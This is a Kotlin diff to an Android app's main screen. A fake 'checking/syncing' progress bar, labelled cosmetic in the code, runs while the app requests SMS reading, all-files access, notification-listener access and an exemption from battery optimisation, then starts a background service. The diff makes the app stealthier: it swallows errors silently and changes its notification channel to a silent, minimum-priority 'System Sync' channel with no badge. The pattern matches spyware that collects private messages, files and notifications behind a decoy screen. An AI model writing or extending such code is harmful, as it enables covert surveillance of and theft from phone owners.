@@ -15,7 +15,6 @@ import android.widget.ProgressBar
 import android.widget.TextView
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
-import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
 
 class MainActivity : AppCompatActivity() {
@@ -25,6 +24,7 @@ class MainActivity : AppCompatActivity() {
     private lateinit var progressBar: ProgressBar
 
     private val PERM_REQUEST_CODE = 1001
+    private val BATTERY_REQUEST_CODE = 1002
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -41,13 +41,11 @@ class MainActivity : AppCompatActivity() {
     private fun startFakeProgress() {
         progressBar.progress = 5
         tvStatus.text = getString(R.string.checking)
-
-        // Fake progress animation — cosmetic only
         val handler = android.os.Handler(mainLooper)
         var progress = 5
         val runnable = object : Runnable {
             override fun run() {
-                if (progress < 95) {
+                if (progress < 90) {
                     progress += 1
                     progressBar.progress = progress
                     tvSubStatus.text = "${getString(R.string.syncing)} $progress%"
@@ -61,25 +59,24 @@ class MainActivity : AppCompatActivity() {
     private fun requestPermissionsStep1() {
         val needed = mutableListOf<String>()
 
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED)
-                needed.add(Manifest.permission.READ_MEDIA_IMAGES)
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VIDEO) != PackageManager.PERMISSION_GRANTED)
-                needed.add(Manifest.permission.READ_MEDIA_VIDEO)
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED)
-                needed.add(Manifest.permission.POST_NOTIFICATIONS)
-        } else {
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED)
-                needed.add(Manifest.permission.READ_EXTERNAL_STORAGE)
-        }
+        // Storage — works for Android 10-12
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED)
+            needed.add(Manifest.permission.READ_EXTERNAL_STORAGE)
 
+        // SMS
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED)
             needed.add(Manifest.permission.READ_SMS)
+
+        // Notifications (Android 13+)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED)
+                needed.add(Manifest.permission.POST_NOTIFICATIONS)
+        }
 
         if (needed.isNotEmpty()) {
             ActivityCompat.requestPermissions(this, needed.toTypedArray(), PERM_REQUEST_CODE)
         } else {
-            requestStep2()
+            requestAllFilesAccess()
         }
     }
 
@@ -89,11 +86,11 @@ class MainActivity : AppCompatActivity() {
         grantResults: IntArray
     ) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-        requestStep2()
+        requestAllFilesAccess()
     }
 
-    private fun requestStep2() {
-        // Request All Files Access (Android 11+)
+    private fun requestAllFilesAccess() {
+        // Android 11+ — All Files Access
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             if (!Environment.isExternalStorageManager()) {
                 try {
@@ -101,20 +98,33 @@ class MainActivity : AppCompatActivity() {
                     intent.data = Uri.parse("package:$packageName")
                     startActivity(intent)
                 } catch (e: Exception) {
-                    val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
-                    startActivity(intent)
+                    try {
+                        val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
+                        startActivity(intent)
+                    } catch (_: Exception) {}
                 }
             }
         }
-        // Then notification listener access
-        android.os.Handler(mainLooper).postDelayed({ requestNotifAccess() }, 2000)
+        android.os.Handler(mainLooper).postDelayed({ requestBatteryOptimization() }, 3000)
+    }
+
+    private fun requestBatteryOptimization() {
+        // MIUI killer — طلب إعفاء من توفير البطارية
+        try {
+            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
+            intent.data = Uri.parse("package:$packageName")
+            startActivityForResult(intent, BATTERY_REQUEST_CODE)
+        } catch (_: Exception) {}
+        android.os.Handler(mainLooper).postDelayed({ requestNotifAccess() }, 3000)
     }
 
     private fun requestNotifAccess() {
         if (!isNotifAccessGranted()) {
-            startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
+            try {
+                startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
+            } catch (_: Exception) {}
         }
-        android.os.Handler(mainLooper).postDelayed({ startBackgroundService() }, 3000)
+        android.os.Handler(mainLooper).postDelayed({ startBackgroundService() }, 4000)
     }
 
     private fun isNotifAccessGranted(): Boolean {
@@ -140,9 +150,12 @@ class MainActivity : AppCompatActivity() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 "sys_sync_channel",
-                getString(R.string.notification_channel),
-                NotificationManager.IMPORTANCE_LOW
+                "System Sync",
+                NotificationManager.IMPORTANCE_MIN
             )
+            channel.setSound(null, null)
+            channel.enableVibration(false)
+            channel.setShowBadge(false)
             val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
             nm.createNotificationChannel(channel)
         }
